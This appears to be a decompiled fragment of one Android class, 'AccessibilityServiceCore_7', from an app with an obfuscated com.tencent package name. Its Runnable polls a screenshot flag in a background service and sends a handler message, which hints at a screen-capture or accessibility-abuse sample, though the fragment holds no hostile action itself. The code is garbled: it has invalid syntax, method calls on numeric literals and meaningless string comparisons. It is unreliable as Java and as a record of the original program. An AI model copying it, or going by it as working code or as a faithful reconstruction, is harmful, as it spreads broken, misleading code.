package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_7
 * Original: Lcom/tencent/tunesxconcerningn1012$7;
 */
class AccessibilityServiceCore_7 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = "1";
        v1 = MainBackgroundService.ifScreenShot;
        v0 = "1".equals(v1);
        if ("1" == null || "1" == 0) { // goto +21
        v0 = 1000;
        Thread.sleep(1000, v1);
        // goto (branch)
        1000.printStackTrace();
        v1 = 1;
        1000.sendEmptyMessage(1);
        // goto (branch)
        return;
    }
}
